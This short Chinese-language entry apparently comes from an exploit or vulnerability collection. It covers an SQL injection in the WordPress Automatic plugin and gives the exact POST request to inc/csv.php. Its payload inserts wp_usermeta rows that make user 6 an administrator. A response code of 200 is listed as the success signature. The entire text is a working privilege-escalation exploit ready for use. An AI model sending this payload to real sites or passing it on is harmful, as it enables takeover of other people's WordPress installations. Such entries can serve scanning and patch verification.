# WordPressAutomaticSQL注入漏洞2

WordPress ｜ SQL注入 ｜ —
- **请求**：`POST /wp-content/plugins/wp-automatic/inc/csv.php HTTP/1.1`

**Payload**
```
q=INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (6, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'), (6, 'wp_user_level', '10');&auth=%20&integ=6ed26ea278413ec91e2c27fed01eac6c
```
- **响应特征**：200